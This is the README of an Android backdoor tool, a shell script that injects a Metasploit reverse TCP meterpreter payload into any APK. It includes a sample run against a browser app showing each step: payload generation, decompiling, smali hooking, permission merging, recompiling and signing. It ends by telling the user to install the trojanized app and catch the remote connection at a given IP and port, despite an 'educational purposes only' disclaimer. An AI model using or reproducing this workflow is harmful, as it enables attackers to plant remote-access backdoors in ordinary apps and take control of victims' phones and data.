# backdoor-apk
backdoor-apk is a shell script that simplifies the process of adding a backdoor to any Android APK file. Users of this shell script should have working knowledge of Linux, Bash, Metasploit, Apktool, the Android SDK, smali, etc. This shell script is provided as-is without warranty of any kind and is intended for educational purposes only.

Usage:

```
root@kali:~/Android/evol-lab/BaiduBrowserRat# ./backdoor-apk.sh BaiduBrowser.apk 
[*] Generating reverse tcp meterpreter payload...done.
[+] Handle the meterpreter connection at: 10.6.9.31:1337
[*] Decompiling original APK file...done.
[*] Decompiling RAT APK file...done.
[*] Creating new directories in original project for RAT smali files...done.
[*] Copying RAT smali files to new directories in original project...done.
[*] Fixing RAT smali files...done.
[*] Locating smali file to hook in original project...done.
[*] Adding hook in original smali file...done.
[*] Merging permissions of original and payload projects...done.
[*] Recompiling original project with backdoor...done.
[*] Signing recompiled APK...done.
root@kali:~/Android/evol-lab/BaiduBrowserRat#
```

The recompiled APK will be found in the 'original/dist' directory. Install the APK on a compatible Android device, run it, and handle the meterpreter connection at the specified IP and port.
